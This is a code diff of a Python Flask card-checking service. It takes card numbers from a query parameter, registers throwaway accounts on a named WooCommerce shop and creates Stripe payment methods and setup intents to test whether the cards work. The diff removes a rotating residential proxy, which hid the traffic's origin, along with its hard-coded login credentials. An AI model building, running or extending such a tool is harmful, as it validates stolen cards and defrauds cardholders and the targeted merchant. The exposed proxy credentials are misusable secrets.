@@ -4,19 +4,10 @@ from flask import Flask, request, jsonify
 app = Flask(__name__)
 
 class PaymentGatewayProcessor:
-    def __init__(self, card_information_string, proxy_url=None):
+    def __init__(self, card_information_string):
         self.card_data = self._parse_card_data(card_information_string)
         self.session_manager = requests.Session()
         self.temporary_username = self._generate_random_username()
-
-        # Proxy default (Digiproxy Rotator)
-        default_proxy_url = "http://9f470d501aae-res-any:XtilnSgD4DSKGV6@residential.digiproxy.cc:5959"
-
-        # Gunakan proxy dari URL kalau ada, kalau tidak pakai default
-        self.proxy = {
-            "http": proxy_url or default_proxy_url,
-            "https": proxy_url or default_proxy_url
-        }
 
     def _parse_card_data(self, card_string):
         components = card_string.strip().split("|")
@@ -41,9 +32,7 @@ class PaymentGatewayProcessor:
         try:
             r = self.session_manager.get(
                 'https://tourshafts.com/my-account/',
-                headers={'User-Agent': self._create_user_agent()},
-                proxies=self.proxy,
-                timeout=30
+                headers={'User-Agent': self._create_user_agent()}
             )
             m = re.search(r'name="woocommerce-register-nonce" value="(.+?)"', r.text)
             return m.group(1) if m else None
@@ -68,7 +57,6 @@ class PaymentGatewayProcessor:
                     'User-Agent': self._create_user_agent(),
                     'Content-Type': 'application/x-www-form-urlencoded'
                 },
-                proxies=self.proxy,
                 timeout=30
             )
             return r.status_code == 200
@@ -80,7 +68,6 @@ class PaymentGatewayProcessor:
             r = self.session_manager.get(
                 'https://tourshafts.com/my-account/add-payment-method/',
                 headers={'User-Agent': self._create_user_agent()},
-                proxies=self.proxy,
                 timeout=30
             )
             m = re.findall(r'"add_card_nonce":"(.+?)"', r.text)
@@ -108,7 +95,6 @@ class PaymentGatewayProcessor:
                 "https://api.stripe.com/v1/payment_methods",
                 data=data,
                 headers=headers,
-                proxies=self.proxy,
                 timeout=30
             )
             if 'id' not in r.text:
@@ -134,7 +120,6 @@ class PaymentGatewayProcessor:
                 "https://tourshafts.com?wc-ajax=wc_stripe_create_setup_intent",
                 data=data,
                 headers=headers,
-                proxies=self.proxy,
                 timeout=30
             )
             return r.json()
@@ -165,20 +150,10 @@ class PaymentGatewayProcessor:
 @app.route("/", methods=["GET"])
 def check_card():
     cc = request.args.get("cc")
-    proxy = request.args.get("proxy")  # Optional override
-    proxy_url = None
-
-    if proxy:
-        try:
-            host, port, user, pwd = proxy.split(":")
-            proxy_url = f"http://{user}:{pwd}@{host}:{port}"
-        except ValueError:
-            proxy_url = proxy  # fallback jika sudah berbentuk URL
-
     if not cc:
         return jsonify({"error": "Missing cc param"}), 400
 
-    processor = PaymentGatewayProcessor(cc, proxy_url=proxy_url)
+    processor = PaymentGatewayProcessor(cc)
     start = time.time()
     result = processor.process_payment()
     result["cc"] = cc
